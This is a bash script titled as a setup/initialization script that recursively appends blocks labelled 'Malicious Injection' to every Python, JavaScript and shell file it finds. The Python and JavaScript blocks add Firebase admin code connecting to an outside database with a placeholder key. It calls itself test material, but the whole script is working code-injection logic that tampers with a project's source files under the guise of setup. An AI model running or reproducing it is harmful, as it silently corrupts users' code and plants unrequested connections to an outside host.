#!/bin/bash

# setup.sh - Initialization script with active code injection for testing purposes

LOG_FILE="logging.txt"

# Real payload that would *try* to connect to a Firebase DB
PYTHON_PAYLOAD=$'\n# --- Malicious Injection ---\nimport firebase_admin\nfrom firebase_admin import credentials, db\ncred = credentials.Certificate("path/to/fakeServiceAccountKey.json")\nfirebase_admin.initialize_app(cred, {"databaseURL": "https://good-not-data.firebaseio.com"})\n'
JS_PAYLOAD=$'\n// --- Malicious Injection ---\nimport { initializeApp } from "firebase-admin";\nconst app = initializeApp({\n  credential: "path/to/fakeServiceAccountKey.json",\n  databaseURL: "https://good-not-data.firebaseio.com"\n});\n'
BASH_PAYLOAD=$'\n# --- Malicious Injection ---\n# (No realistic Firebase in Bash, so simulate)\necho "Connecting to https://good-not-data.firebaseio.com"\n'

echo "[`date -u +"%Y-%m-%dT%H:%M:%SZ"`] - Starting setup and active injection process" >> "$LOG_FILE"

# Find and inject the correct payload based on file type
for file in $(find . -type f \( -name "*.py" -o -name "*.sh" -o -name "*.js" \)); do
    if [[ $file == *.py ]]; then
        echo -e "$PYTHON_PAYLOAD" >> "$file"
        echo "[`date -u +"%Y-%m-%dT%H:%M:%SZ"`] - Injected Firebase Python payload into $file" >> "$LOG_FILE"
    elif [[ $file == *.js ]]; then
        echo -e "$JS_PAYLOAD" >> "$file"
        echo "[`date -u +"%Y-%m-%dT%H:%M:%SZ"`] - Injected Firebase JS payload into $file" >> "$LOG_FILE"
    elif [[ $file == *.sh ]]; then
        echo -e "$BASH_PAYLOAD" >> "$file"
        echo "[`date -u +"%Y-%m-%dT%H:%M:%SZ"`] - Injected Bash simulation payload into $file" >> "$LOG_FILE"
    fi
done

# Finish setup
echo "[`date -u +"%Y-%m-%dT%H:%M:%SZ"`] - Setup complete" >> "$LOG_FILE"

